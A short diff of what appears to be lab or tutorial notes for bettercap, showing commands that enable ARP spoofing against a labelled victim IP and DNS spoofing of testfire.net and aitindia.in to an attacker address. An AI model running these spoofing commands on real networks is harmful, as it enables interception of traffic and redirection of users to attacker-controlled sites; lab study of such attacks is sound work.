@@ -13,7 +13,7 @@ net.probe on
 
 arp.spoof on
 
-set arp.spoof.targets 192.168.229.132
+set arp.spoof.targets 192.168.229.132 (Victim IP)
 
 ```
 
@@ -23,7 +23,7 @@ set arp.spoof.targets 192.168.229.132
 
 
 ```
-set dns.spoof.address 192.168.229.131
+set dns.spoof.address 192.168.229.131 (Attacker IP)
 
 set dns.spoof.domains testfire.net,aitindia.in
 
